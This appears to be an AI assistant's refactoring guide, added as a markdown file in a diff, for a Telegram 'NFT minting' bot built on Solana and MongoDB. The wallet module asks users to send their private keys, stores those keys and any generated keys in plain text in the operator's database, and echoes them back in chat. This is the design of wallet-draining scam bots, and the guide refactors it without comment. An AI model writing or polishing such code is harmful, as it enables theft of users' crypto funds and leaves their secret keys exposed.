@@ -1,0 +1,243 @@
+To structure your code professionally and make it more maintainable, you should split it into multiple components/modules. Here's how you can organize it:
+
+### 📌 **Refactored Structure:**
+```
+/bot
+ ├── index.js            # Entry point for the bot
+ ├── bot.js              # Initializes the bot instance and event listeners
+ ├── commands
+ │   ├── start.js        # Handles the /start command
+ │   ├── wallet.js       # Handles wallet-related actions
+ ├── services
+ │   ├── solanaService.js # Handles Solana wallet actions (fetch balance, create/import wallet)
+ ├── models
+ │   ├── userModel.js    # User model for MongoDB
+ ├── config.js           # Stores environment variables and bot token
+ ├── utils.js            # Utility functions
+ └── .env                # Stores environment variables
+```
+
+---
+
+## 🔹 **Step-by-Step Refactor**
+### **1️⃣ Create `config.js`**
+```js
+require("dotenv").config();
+
+module.exports = {
+  BOT_TOKEN: process.env.BOT_TOKEN,
+};
+```
+
+---
+
+### **2️⃣ Create `bot.js`**
+```js
+const TelegramBot = require("node-telegram-bot-api");
+const { BOT_TOKEN } = require("./config");
+
+const bot = new TelegramBot(BOT_TOKEN, { polling: true });
+
+module.exports = bot;
+```
+
+---
+
+### **3️⃣ Create `commands/start.js`**
+```js
+const bot = require("../bot");
+const User = require("../models/userModel");
+
+bot.onText(/\/start/, async (msg) => {
+  const chatId = msg.chat.id;
+
+  const telegramId = String(chatId);
+  const firstName = msg.from.first_name;
+  const lastName = msg.from.last_name || "";
+  const username = msg.from.username || "";
+
+  try {
+    await User.findOneAndUpdate(
+      { telegramId },
+      { telegramId, firstName, lastName, username },
+      { upsert: true, new: true }
+    );
+    console.log("User saved to database");
+  } catch (error) {
+    console.error("Error saving user:", error.message);
+  }
+
+  bot.sendMessage(
+    chatId,
+    "🔥 Welcome to the Ultimate NFT Minting Bot! 🚀\n\nChoose an option below:",
+    {
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: "🎨 NFT Mint", callback_data: "nft_mint" }],
+          [{ text: "🔑 Wallet Connect", callback_data: "wallet_connect" }],
+          [
+            { text: "💬 Join Group", url: "https://t.me/+FzW-EwhbQnBkZDE0" },
+            { text: "📢 Join Channel", url: "https://t.me/lmnftminter" },
+          ],
+        ],
+      },
+    }
+  );
+});
+```
+
+---
+
+### **4️⃣ Create `services/solanaService.js`**
+```js
+const solanaWeb3 = require("@solana/web3.js");
+const bs58 = require("bs58");
+
+async function fetchSolBalance(walletAddress) {
+  try {
+    const connection = new solanaWeb3.Connection(
+      solanaWeb3.clusterApiUrl("mainnet-beta")
+    );
+    const balance = await connection.getBalance(
+      new solanaWeb3.PublicKey(walletAddress)
+    );
+    return (balance / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4);
+  } catch (error) {
+    console.error("Error fetching balance:", error);
+    return "0";
+  }
+}
+
+function createNewWallet() {
+  const wallet = solanaWeb3.Keypair.generate();
+  return {
+    publicKey: wallet.publicKey.toBase58(),
+    privateKey: bs58.encode(wallet.secretKey),
+  };
+}
+
+function importWallet(privateKeyString) {
+  try {
+    const secretKey = bs58.decode(privateKeyString);
+    const wallet = solanaWeb3.Keypair.fromSecretKey(secretKey);
+    return {
+      publicKey: wallet.publicKey.toBase58(),
+      privateKey: privateKeyString,
+    };
+  } catch (error) {
+    console.error("Import Error:", error);
+    return null;
+  }
+}
+
+module.exports = { fetchSolBalance, createNewWallet, importWallet };
+```
+
+---
+
+### **5️⃣ Create `commands/wallet.js`**
+```js
+const bot = require("../bot");
+const User = require("../models/userModel");
+const { fetchSolBalance, createNewWallet, importWallet } = require("../services/solanaService");
+const bs58 = require("bs58");
+
+bot.on("callback_query", async (query) => {
+  const chatId = query.message.chat.id;
+  const data = query.data;
+
+  if (data === "wallet_connect") {
+    const user = await User.findOne({ telegramId: chatId });
+
+    if (user && user.walletAddress) {
+      const balance = await fetchSolBalance(user.walletAddress);
+      bot.sendMessage(
+        chatId,
+        `✅ Wallet Connected!\n\n🔹 **Address:** \`${user.walletAddress}\`\n💰 **Balance:** \`${balance} SOL\`\n🔐 **Private Key:** \`${user.privateKey}\``,
+        { parse_mode: "Markdown" }
+      );
+    } else {
+      bot.sendMessage(chatId, "How would you like to connect your Solana wallet?", {
+        reply_markup: {
+          inline_keyboard: [
+            [{ text: "🔑 Import Existing Wallet", callback_data: "import_wallet" }],
+            [{ text: "🆕 Create New Wallet", callback_data: "create_wallet" }],
+          ],
+        },
+      });
+    }
+  } else if (data === "create_wallet") {
+    const { publicKey, privateKey } = createNewWallet();
+
+    try {
+      await User.findOneAndUpdate(
+        { telegramId: chatId },
+        { walletAddress: publicKey, privateKey: privateKey },
+        { upsert: true, new: true }
+      );
+
+      bot.sendMessage(
+        chatId,
+        `✅ **Wallet Created!**\n\n🔹 **Address:** \`${publicKey}\`\n🔐 **Private Key (Keep Safe!):** \`${privateKey}\``,
+        { parse_mode: "Markdown" }
+      );
+
+      const balance = await fetchSolBalance(publicKey);
+      bot.sendMessage(chatId, `💰 **Your SOL Balance:** \`${balance} SOL\``, { parse_mode: "Markdown" });
+    } catch (error) {
+      console.error("Error saving wallet:", error);
+      bot.sendMessage(chatId, "❌ Failed to save wallet. Please try again.");
+    }
+  } else if (data === "import_wallet") {
+    bot.sendMessage(chatId, "Send me your **private key** to import your wallet.", { parse_mode: "Markdown" });
+  }
+});
+
+// Handle private key input
+bot.on("message", async (msg) => {
+  const chatId = msg.chat.id;
+  const text = msg.text;
+
+  if (text.startsWith("/") || (await User.findOne({ telegramId: chatId, walletAddress: { $ne: null } }))) return;
+
+  const wallet = importWallet(text);
+  if (!wallet) {
+    bot.sendMessage(chatId, "❌ Invalid private key! Please try again.");
+    return;
+  }
+
+  await User.findOneAndUpdate(
+    { telegramId: chatId },
+    { walletAddress: wallet.publicKey, privateKey: wallet.privateKey },
+    { upsert: true, new: true }
+  );
+
+  const balance = await fetchSolBalance(wallet.publicKey);
+  bot.sendMessage(
+    chatId,
+    `✅ **Wallet Imported!**\n\n🔹 **Address:** \`${wallet.publicKey}\`\n🔐 **Private Key:** \`${wallet.privateKey}\`\n💰 **Your SOL Balance:** \`${balance} SOL\``,
+    { parse_mode: "Markdown" }
+  );
+});
+```
+
+---
+
+### **6️⃣ Update `index.js` (Main Entry Point)**
+```js
+require("./commands/start");
+require("./commands/wallet");
+
+console.log("Bot is running...");
+```
+
+---
+
+## ✅ **Final Thoughts**
+Now, your bot is well-structured:
+- **`bot.js`** manages the bot instance.
+- **`commands/`** handles different bot functionalities (`start.js`, `wallet.js`).
+- **`services/solanaService.js`** deals with wallet actions.
+- **`models/userModel.js`** (not shown here) stores user data.
+
+This makes your code **clean**, **modular**, and **easy to maintain**. 🚀
